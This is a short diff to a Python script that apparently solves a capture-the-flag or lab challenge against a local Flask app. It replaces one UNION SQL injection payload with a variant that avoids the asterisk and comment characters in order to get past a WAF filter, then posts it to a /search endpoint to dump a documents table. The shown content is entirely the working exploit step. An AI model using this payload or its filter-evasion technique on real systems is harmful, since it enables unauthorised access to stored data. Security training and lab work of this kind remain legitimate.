@@ -12,9 +12,8 @@ def solve():
     init_db()
     client = app.test_client()
     
-    print("[+] Step 2: Exploiting Web Search via Medium-Hard UNION SQL Injection...")
-    # Using UNION SELECT * bypass payload (avoids WAF blacklist and dumps all documents at once)
-    sqli_payload = "%' UNION SELECT * FROM documents --"
+    # Using Advanced Commentless, Asterisk-less UNION SELECT payload (bypasses strict WAF blocking *, --, #, OR)
+    sqli_payload = "%' UNION SELECT title, access_level, file_path, author FROM documents UNION SELECT '1','2','3','4"
     res = client.post("/search", data={'q': sqli_payload})
     html = res.data.decode('utf-8')
     
